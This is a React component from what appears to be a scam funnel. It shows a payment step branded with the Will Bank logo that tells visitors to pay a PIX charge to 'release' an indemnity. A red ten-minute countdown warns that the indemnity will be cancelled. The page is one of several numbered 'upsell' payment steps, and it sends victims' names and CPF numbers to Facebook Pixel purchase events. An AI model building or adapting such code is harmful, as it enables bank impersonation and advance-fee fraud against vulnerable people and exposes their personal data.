import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Copy, Clock, Loader2 } from "lucide-react";
import WillBankCard from "@/components/WillBankCard";
import { toast } from "@/hooks/use-toast";
import willbankLogo from "@/assets/willbank-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
import { fbEvents } from "@/lib/fbPixel";

interface UpsellStepProps {
  title: string;
  description: string;
  valor: number;
  cpfData: {
    nome: string;
    cpf: string;
  };
  protocolo: string;
  onPaymentConfirmed: () => void;
  stepNumber: number;
  totalSteps: number;
}

interface PixData {
  code: string;
  qrcode_base64: string;
  transaction_id: string;
  external_id: string;
}

const UpsellStep = ({
  title,
  description,
  valor,
  cpfData,
  protocolo,
  onPaymentConfirmed,
  stepNumber,
}: UpsellStepProps) => {
  const [isProcessing, setIsProcessing] = useState(false);
  const [countdown, setCountdown] = useState(600); // 10 minutes
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [isLoadingPix, setIsLoadingPix] = useState(true);
  const [pixError, setPixError] = useState<string | null>(null);
  const [showPix, setShowPix] = useState(false);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const pixStorageKey = getPixStorageKey("upsell", stepNumber);

  // Generate PIX on mount or restore from storage
  useEffect(() => {
    // Check for existing valid PIX for this step
    const storedPix = getStoredPixData(pixStorageKey);
    if (storedPix) {
      setPixData({
        code: storedPix.code,
        qrcode_base64: storedPix.qrcode_base64,
        transaction_id: storedPix.transaction_id,
        external_id: storedPix.external_id,
      });
      setCountdown(getPixRemainingTime(pixStorageKey));
      setIsLoadingPix(false);
      startPaymentCheck(storedPix.external_id);
      return;
    }

    const generatePix = async () => {
      try {
        setIsLoadingPix(true);
        setPixError(null);

        const amountInCents = Math.round(valor * 100);
        const externalId = `${protocolo}-UP${stepNumber}-${Date.now()}`;

        const urlParams = new URLSearchParams(window.location.search);

        const response = await supabase.functions.invoke('create-pix', {
          body: {
            amount: amountInCents,
            external_id: externalId,
            buyer: {
              name: cpfData.nome,
              email: `${cpfData.nome.toLowerCase().replace(/\s+/g, '.')}@api.com`,
              document: cpfData.cpf.replace(/\D/g, ''),
            },
            product: {
              id: `upsell-${stepNumber}`,
              name: title,
            },
            tracking: {
              utm_source: urlParams.get('utm_source'),
              utm_medium: urlParams.get('utm_medium'),
              utm_campaign: urlParams.get('utm_campaign'),
              utm_content: urlParams.get('utm_content'),
              utm_term: urlParams.get('utm_term'),
              utm_id: urlParams.get('utm_id'),
              src: urlParams.get('src'),
              sck: urlParams.get('sck'),
              ref: urlParams.get('ref'),
            },
          },
        });

        if (response.error) {
          console.error('Error creating PIX:', response.error);
          setPixError('Erro ao gerar PIX. Tente novamente.');
          return;
        }

        const data = response.data;
        if (data?.data?.pix) {
          const newPixData = {
            code: data.data.pix.code,
            qrcode_base64: data.data.pix.qrcode_base64,
            transaction_id: data.data.id,
            external_id: externalId,
          };
          setPixData(newPixData);

          // Save to localStorage for persistence
          savePixData(pixStorageKey, newPixData);

          startPaymentCheck(externalId);
        } else {
          setPixError('Resposta inválida do servidor.');
        }
      } catch (error) {
        console.error('Error generating PIX:', error);
        setPixError('Erro ao gerar PIX. Tente novamente.');
      } finally {
        setIsLoadingPix(false);
      }
    };

    generatePix();

    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
      }
    };
  }, [valor, cpfData, protocolo, stepNumber, title, pixStorageKey]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const startPaymentCheck = (externalId: string) => {
    checkIntervalRef.current = setInterval(async () => {
      try {
        const response = await supabase.functions.invoke('check-pix-status', {
          body: { external_id: externalId },
        });

        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) {
            clearInterval(checkIntervalRef.current);
          }
          
          // Fire Facebook Pixel Purchase event (client + server)
          fbEvents.purchase({ value: valor, currency: 'BRL', content_name: title });
          fbEvents.serverPurchase({ 
            first_name: cpfData.nome.split(' ')[0], 
            cpf: cpfData.cpf, 
            value: valor, 
            content_name: title 
          });
          
          toast({
            title: "Pagamento confirmado!",
            description: "Processando próxima etapa...",
          });
          onPaymentConfirmed();
        }
      } catch (error) {
        console.error('Error checking payment status:', error);
      }
    }, 5000);
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopiarPix = () => {
    if (pixData?.code) {
      navigator.clipboard.writeText(pixData.code);
      toast({
        title: "Código PIX copiado! ✓",
        description: "Cole o código no seu aplicativo bancário",
      });
    }
  };

  const handleConfirmarPagamento = async () => {
    setIsProcessing(true);

    if (pixData?.external_id) {
      try {
        const response = await supabase.functions.invoke('check-pix-status', {
          body: { external_id: pixData.external_id },
        });

        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) {
            clearInterval(checkIntervalRef.current);
          }
          
          // Fire Facebook Pixel Purchase event (client + server)
          fbEvents.purchase({ value: valor, currency: 'BRL', content_name: title });
          fbEvents.serverPurchase({ 
            first_name: cpfData.nome.split(' ')[0], 
            cpf: cpfData.cpf, 
            value: valor, 
            content_name: title 
          });
          
          toast({
            title: "Pagamento confirmado!",
            description: "Processando próxima etapa...",
          });
          onPaymentConfirmed();
        } else {
          toast({
            title: "Aguardando pagamento",
            description: "Ainda não identificamos o pagamento. Tente novamente em alguns segundos.",
            variant: "destructive",
          });
        }
      } catch {
        toast({
          title: "Erro ao verificar",
          description: "Tente novamente em alguns segundos.",
          variant: "destructive",
        });
      }
    }

    setIsProcessing(false);
  };

  const handlePagarAgora = () => {
    setShowPix(true);
  };

  if (pixError) {
    return (
      <WillBankCard className="w-full max-w-lg">
        <div className="flex flex-col items-center justify-center py-12 space-y-4">
          <p className="text-destructive font-medium text-center">{pixError}</p>
          <Button onClick={() => window.location.reload()} variant="outline">
            Tentar novamente
          </Button>
        </div>
      </WillBankCard>
    );
  }

  return (
    <WillBankCard className="w-full max-w-lg">
      <div className="space-y-5 sm:space-y-6">
        {/* Header */}
        <div className="text-center space-y-2">
          <img src={willbankLogo} alt="Will Bank" className="h-10 sm:h-12 mx-auto" />
          <h1 className="text-lg sm:text-xl font-bold tracking-tight">{title}</h1>
          <p className="text-sm text-muted-foreground">{description}</p>
        </div>

        {/* Countdown */}
        <div className="bg-gradient-to-r from-red-50 to-red-100 border-2 border-red-200 rounded-xl sm:rounded-2xl p-4 text-center shadow-sm">
          <div className="flex items-center justify-center gap-2 text-red-600">
            <Clock className="w-4 h-4 sm:w-5 sm:h-5" />
            <span className="font-semibold text-sm">Tempo restante:</span>
          </div>
          <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
          <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">Após este prazo, sua indenização será cancelada</p>
        </div>

        {/* Value */}
        <div className="bg-muted/50 rounded-xl sm:rounded-2xl p-4 space-y-3 border border-border/40">
          <div className="flex justify-between items-center">
            <span className="text-muted-foreground font-medium text-sm">Valor a pagar:</span>
            <span className="font-black text-base sm:text-lg text-primary">R$ {valor.toFixed(2).replace('.', ',')}</span>
          </div>
        </div>

        {!showPix ? (
          /* Initial State - Show only the main button */
          <>
            <Button 
              onClick={handlePagarAgora}
              disabled={isLoadingPix}
              className="w-full h-14 text-sm sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
            >
              {isLoadingPix ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
                  Preparando pagamento...
                </>
              ) : (
                "Pagar agora e liberar indenização"
              )}
            </Button>

            {/* Dev Test Button - only visible in development */}
            {import.meta.env.DEV && (
              <Button 
                onClick={() => {
                  if (checkIntervalRef.current) {
                    clearInterval(checkIntervalRef.current);
                  }
                  toast({
                    title: "[DEV] Pagamento simulado!",
                    description: "Navegando para próxima etapa...",
                  });
                  onPaymentConfirmed();
                }}
                variant="outline"
                className="w-full h-10 text-xs border-dashed border-2 border-orange-400 text-orange-600 hover:bg-orange-50"
              >
                🧪 [DEV] Simular Pagamento
              </Button>
            )}
          </>
        ) : (
          /* Expanded State - Show PIX QR Code */
          <>
            {/* QR Code */}
            <div className="text-center space-y-4 animate-in fade-in slide-in-from-top-4 duration-300">
              <p className="text-xs sm:text-sm text-muted-foreground font-medium">Escaneie o QR Code ou copie o código PIX:</p>
              
              <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-card rounded-xl sm:rounded-2xl border-2 sm:border-3 border-primary p-2.5 shadow-lg">
                {pixData?.qrcode_base64 ? (
                  <img 
                    src={`data:image/png;base64,${pixData.qrcode_base64}`} 
                    alt="QR Code PIX" 
                    className="w-full h-full rounded-lg"
                  />
                ) : (
                  <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
                    <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
                  </div>
                )}
              </div>

              <Button
                variant="outline"
                onClick={handleCopiarPix}
                disabled={!pixData?.code}
                className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full font-bold text-sm transition-all duration-300"
              >
                <Copy className="w-4 h-4 mr-2" />
                Copiar código PIX
              </Button>
            </div>

            {/* Confirm Button */}
            <Button 
              onClick={handleConfirmarPagamento}
              disabled={isProcessing || !pixData}
              className="w-full h-14 text-sm sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
                  Verificando pagamento...
                </>
              ) : (
                "Já paguei, liberar indenização"
              )}
            </Button>

            {/* Dev Test Button - only visible in development */}
            {import.meta.env.DEV && (
              <Button 
                onClick={() => {
                  if (checkIntervalRef.current) {
                    clearInterval(checkIntervalRef.current);
                  }
                  toast({
                    title: "[DEV] Pagamento simulado!",
                    description: "Navegando para próxima etapa...",
                  });
                  onPaymentConfirmed();
                }}
                variant="outline"
                className="w-full h-10 text-xs border-dashed border-2 border-orange-400 text-orange-600 hover:bg-orange-50"
              >
                🧪 [DEV] Simular Pagamento
              </Button>
            )}

            <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
              Após a confirmação, sua indenização será liberada.
            </p>
          </>
        )}
      </div>
    </WillBankCard>
  );
};

export default UpsellStep;
